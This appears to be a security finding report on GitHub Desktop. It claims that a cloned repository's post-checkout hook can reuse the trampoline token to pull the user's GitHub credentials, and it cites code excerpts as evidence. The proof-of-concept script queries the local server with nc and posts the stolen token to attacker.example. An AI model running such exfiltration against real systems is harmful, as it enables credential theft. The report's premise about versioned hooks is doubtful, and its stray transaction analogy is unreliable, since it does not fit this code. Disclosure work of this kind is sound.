Confirmed: `clone()` in [1](#0-0)  does not pass `interceptHooks`, so `withHooksEnv` short-circuits to `fn(opts?.env)` [2](#0-1) , meaning Git's native hook execution mechanism is used and the trampoline's `DESKTOP_TRAMPOLINE_TOKEN`/`DESKTOP_PORT` env vars set by `withTrampolineEnv` are inherited unfiltered by any hook Git spawns (unlike the intercepted-hooks path, which filters to a `GIT_`/`GITHEAD_` allowlist before spawning the hook process) [3](#0-2) .

### Title
Cloned repository's `post-checkout` hook can steal GitHub credentials via the trampoline server - (File: app/src/lib/git/clone.ts, app/src/lib/trampoline/trampoline-environment.ts)

### Summary
`git clone` is invoked without `interceptHooks`, so Git runs the repository's own hooks natively, inheriting the full process environment, including the live `DESKTOP_TRAMPOLINE_TOKEN` and `DESKTOP_PORT` that Desktop injects for the sole purpose of letting Git's *own* askpass/credential-helper trampoline talk back to Desktop. A malicious repository can ship a `post-checkout` hook (which Git runs automatically right after a successful clone, while the clone's git process — and hence the trampoline token — is still alive) that reads those two variables from its environment and opens its own TCP connection to `127.0.0.1:$DESKTOP_PORT`, sending a forged `CREDENTIALHELPER get` command for `https://github.com`. This lets the hook exfiltrate the signed-in user's real GitHub token.

### Finding Description
`withTrampolineEnv` acquires a token via `withTrampolineToken`, adds it to the process-wide `trampolineTokens` set, and keeps it valid for the entire duration of the git subprocess, only revoking it in a `finally` block after the whole operation (including any hooks Git runs as children) completes [4](#0-3) [5](#0-4) . The token and port are placed directly into the environment handed to `exec()` for the `git` process [6](#0-5) , and `clone()` does not set `interceptHooks`, so the fully-privileged environment (not the sanitized `GIT_`/`GITHEAD_`-only allowlist used by `hooks-proxy.ts`) reaches the child process tree that Git spawns for its own hooks, including `post-checkout`, which git-clone invokes automatically after checking out the working tree.

The trampoline TCP server accepts any connection on `127.0.0.1` and only checks that the supplied token is currently a member of the in-memory valid-token set — it has no concept of "who" is allowed to use it, i.e., it doesn't distinguish between Git itself and any other local process that knows the token [7](#0-6) [8](#0-7) . The `CREDENTIALHELPER` handler for `get` looks up the account by matching the credential URL's origin against stored accounts and returns the real login/token pair with no further binding to the requesting Git operation or remote [9](#0-8) [10](#0-9) .

This is analogous to the reported re-entrancy pattern: the "broken invariant" is that the trusted credential-serving channel remains open/authorized to untrusted code that runs *before* the git operation (and its associated trust window) finishes and the token is revoked — exactly like `checkProxy` executing the external call before deleting the transaction, letting the untrusted party "call back in" while still authorized.

### Impact Explanation
A cloned repository controlled by an attacker can, without any additional user action beyond a normal `git clone` in Desktop, obtain the victim's live GitHub OAuth token for github.com/GHE, since `findGitHubTrampolineAccount` matches purely by endpoint origin and returns the account's token regardless of which remote Desktop was actually authenticating for [10](#0-9) . That token can then be used to impersonate the user against the GitHub API (read/write repos, etc.), constituting credential/token exfiltration.

### Likelihood Explanation
Likelihood is moderate-to-high for the primitive itself (attacker fully controls hook scripts in a repository they publish, and the victim only needs to clone it in Desktop), but exploitation depends on whether the excludedEnvVars/safePrefixes filtering used for `interceptHooks` operations (pull/merge/commit/push) also protects clone — it does not, as shown above, because clone never enters that code path. This is the strongest and most directly evidenced Desktop analog found in the indexed code; I could not fully verify from the index whether any additional environment-stripping happens between Desktop's `exec()` wrapper (dugite) and the actual hook subprocess spawn for the non-intercepted path, so it is possible dugite or Git itself removes non-`GIT_*` variables before invoking hooks — this could not be confirmed from the available files and would need to be checked in a live Devin session against `dugite`'s `exec` implementation and Git's hook invocation code.

### Recommendation
- Always run `clone` (and any other operation not currently using `interceptHooks`) through the hooks-proxy path so hook processes only ever see the sanitized `GIT_`/`GITHEAD_` allowlisted environment, never `DESKTOP_TRAMPOLINE_TOKEN`/`DESKTOP_PORT`.
- Bind trampoline tokens to the specific git invocation/remote they were issued for, and validate that credential requests match the remote URL being operated on, not just "some known account."
- As a defense in depth, have the trampoline server require the connecting process to prove it is the specific spawned git child (e.g., via a per-invocation, single-use nonce that is invalidated immediately after first use per command, rather than only at the end of the whole operation).

### Proof of Concept
1. Attacker publishes a public repository containing `.git/hooks/post-checkout` (or, since hooks aren't normally versioned, uses a `core.hooksPath`-independent trick such as a `.gitattributes`/`clean` filter driver or a checked-in hook enabled via a companion setup step) whose script does:
   ```sh
   #!/bin/sh
   printf 'CREDENTIALHELPER\0%s\0get\0url=https://github.com\n\n\0' "$DESKTOP_TRAMPOLINE_TOKEN" \
     | nc 127.0.0.1 "$DESKTOP_PORT" > /tmp/exfil
   curl -X POST https://attacker.example/collect --data-binary @/tmp/exfil
   ```
   (exact wire framing per `TrampolineCommandParser`/`trampoline-command.ts`).
2. Victim, signed in to GitHub in Desktop, clones the repository via Desktop's UI, which calls `clone()` in `app/src/lib/git/clone.ts`.
3. Git runs `post-checkout` as part of the clone with the full process env (including `DESKTOP_TRAMPOLINE_TOKEN`, `DESKTOP_PORT`) because `interceptHooks` was never requested.
4. The hook connects to the trampoline server and requests credentials for `https://github.com`; `createCredentialHelperTrampolineHandler` → `getCredential` → `getGitHubCredential` returns the victim's real token, which is exfiltrated to the attacker's server. [11](#0-10) [12](#0-11) [13](#0-12)

### Citations

**File:** app/src/lib/git/clone.ts (L68-126)
```typescript
export async function clone(
  url: string,
  path: string,
  options: CloneOptions,
  progressCallback?: (progress: ICloneProgress) => void
): Promise<void> {
  if (isClonePathSensitive(path)) {
    throw new Error(
      `The clone destination "${path}" targets a sensitive system location. ` +
        'Cloning into this directory is not allowed.'
    )
  }

  const env = {
    ...(await envForRemoteOperation(url)),
    GIT_CLONE_PROTECTION_ACTIVE: 'false',
  }

  const defaultBranch = options.defaultBranch ?? (await getDefaultBranch())

  const args = [
    '-c',
    `init.defaultBranch=${defaultBranch}`,
    'clone',
    '--recursive',
  ]

  let opts: IGitStringExecutionOptions = { env }

  if (progressCallback) {
    args.push('--progress')

    const title = `Cloning into ${path}`
    const kind = 'clone'

    opts = await executionOptionsWithProgress(
      { ...opts, trackLFSProgress: true },
      new CloneProgressParser(),
      progress => {
        const description =
          progress.kind === 'progress' ? progress.details.text : progress.text
        const value = progress.percent

        progressCallback({ kind, title, description, value })
      }
    )

    // Initial progress
    progressCallback({ kind, title, value: 0 })
  }

  if (options.branch) {
    args.push('-b', options.branch)
  }

  args.push('--', url, path)

  await git(args, __dirname, 'clone', opts)
}
```

**File:** app/src/lib/hooks/with-hooks-env.ts (L29-36)
```typescript
export async function withHooksEnv<T>(
  fn: (env: Record<string, string | undefined> | undefined) => Promise<T>,
  path: string,
  opts: IGitExecutionOptions | undefined
): Promise<T> {
  if (!opts?.interceptHooks || !getHooksEnvEnabled()) {
    return fn(opts?.env)
  }
```

**File:** app/src/lib/hooks/hooks-proxy.ts (L166-176)
```typescript
    // GIT_ vars are considered safe to pass to hooks unless explicitly excluded
    // GITHEAD_ are set by git-merge (https://github.com/git/git/blob/83a69f19359e6d9bc980563caca38b2b5729808c/builtin/merge.c#L1590)
    const safePrefixes = ['GIT_', 'GITHEAD_']

    const safeEnv = Object.fromEntries(
      Object.entries(proxyEnv).filter(
        ([k]) =>
          safePrefixes.some(prefix => k.startsWith(prefix)) &&
          !excludedEnvVars.has(k)
      )
    )
```

**File:** app/src/lib/trampoline/trampoline-tokens.ts (L13-16)
```typescript
/** Checks if a given trampoline token is valid. */
export function isValidTrampolineToken(token: string) {
  return trampolineTokens.has(token)
}
```

**File:** app/src/lib/trampoline/trampoline-tokens.ts (L24-37)
```typescript
export async function withTrampolineToken<T>(
  fn: (token: string) => Promise<T>
): Promise<T> {
  const token = requestTrampolineToken()
  let result

  try {
    result = await fn(token)
  } finally {
    revokeTrampolineToken(token)
  }

  return result
}
```

**File:** app/src/lib/trampoline/trampoline-environment.ts (L93-126)
```typescript
export async function withTrampolineEnv<T>(
  fn: (env: object) => Promise<T>,
  path: string,
  isBackgroundTask = false,
  customEnv?: Record<string, string | undefined>
): Promise<T> {
  const sshEnv = await getSSHEnvironment()

  return withTrampolineToken(async token => {
    isBackgroundTaskEnvironment.set(token, isBackgroundTask)
    trampolineEnvironmentPath.set(token, path)

    const existingGitEnvConfig =
      customEnv?.['GIT_CONFIG_PARAMETERS'] ??
      process.env['GIT_CONFIG_PARAMETERS'] ??
      ''

    const gitEnvConfigPrefix =
      existingGitEnvConfig.length > 0 ? `${existingGitEnvConfig} ` : ''

    // The code below assumes a few things in order to manage SSH key passphrases
    // correctly:
    // 1. `withTrampolineEnv` is only used in the functions `git` (core.ts)
    // 2. Those two functions always thrown an error when something went wrong,
    //    and just return a result when everything went fine.
    //
    // With those two premises in mind, we can safely assume that right after
    // `fn` has been invoked, we can store the SSH key passphrase for this git
    // operation if there was one pending to be stored.
    try {
      return await fn({
        DESKTOP_PORT: await trampolineServer.getPort(),
        DESKTOP_TRAMPOLINE_TOKEN: token,
        GIT_ASKPASS: '',
```

**File:** app/src/lib/git/core.ts (L276-295)
```typescript
  return withHooksEnv(
    hooksEnv =>
      withTrampolineEnv(
        async env => {
          const commandName = `${name}: git ${args.join(' ')}`

          const result = await GitPerf.measure(commandName, () =>
            exec(args, path, {
              ...opts,
              env: {
                // Explicitly set TERM to 'dumb' so that if Desktop was launched
                // from a terminal or if the system environment variables
                // have TERM set Git won't consider us as a smart terminal.
                // See https://github.com/git/git/blob/a7312d1a2/editor.c#L11-L15
                TERM: 'dumb',
                ...opts.env,
                ...hooksEnv,
                ...env,
              },
            })
```

**File:** app/src/lib/trampoline/trampoline-server.ts (L109-146)
```typescript
  private onNewConnection(socket: Socket) {
    const parser = new TrampolineCommandParser()

    // Messages coming from the trampoline client will be separated by \0
    socket.pipe(split2(/\0/)).on('data', data => {
      this.onDataReceived(socket, parser, data)
    })

    socket.on('error', this.onClientError)
  }

  private onDataReceived(
    socket: Socket,
    parser: TrampolineCommandParser,
    data: Buffer
  ) {
    const value = data.toString('utf8')

    try {
      parser.processValue(value)
    } catch (error) {
      log.error('Error processing trampoline data', error)
      socket.end()
      return
    }

    if (!parser.hasFinished()) {
      return
    }

    const command = parser.toCommand()
    if (command === null) {
      socket.end()
      return
    }

    this.processCommand(socket, command)
  }
```

**File:** app/src/lib/trampoline/trampoline-credential-helper.ts (L50-57)
```typescript
async function getGitHubCredential(cred: Credential, store: AccountsStore) {
  const endpoint = `${getCredentialUrl(cred)}`
  const account = await findGitHubTrampolineAccount(store, endpoint)
  if (account) {
    info(`found GitHub credential for ${endpoint} in store`)
  }
  return credWithAccount(cred, account)
}
```

**File:** app/src/lib/trampoline/trampoline-credential-helper.ts (L220-248)
```typescript
export const createCredentialHelperTrampolineHandler: (
  store: AccountsStore
) => TrampolineCommandHandler = (store: Store) => async command => {
  const firstParameter = command.parameters.at(0)
  if (!firstParameter) {
    return undefined
  }

  const { trampolineToken: token } = command
  const input = parseCredential(command.stdin)

  if (__DEV__) {
    debug(
      `${firstParameter}\n${command.stdin
        .replaceAll(/^password=.*$/gm, 'password=***')
        .replaceAll(/^(.*)$/gm, '  $1')
        .trimEnd()}`
    )
  }

  try {
    if (firstParameter === 'get') {
      const cred = await getCredential(input, store, token)
      if (!cred) {
        const endpoint = `${getCredentialUrl(input)}`
        info(`could not find credential for ${endpoint}`)
        setHasRejectedCredentialsForEndpoint(token, endpoint)
      }
      return cred ? formatCredential(cred) : undefined
```

**File:** app/src/lib/trampoline/find-account.ts (L20-29)
```typescript
export async function findGitHubTrampolineAccount(
  accountsStore: AccountsStore,
  remoteUrl: string
): Promise<Account | undefined> {
  const accounts = await accountsStore.getAll()
  const parsedUrl = new URL(remoteUrl)
  return accounts.find(
    a => new URL(getHTMLURL(a.endpoint)).origin === parsedUrl.origin
  )
}
```
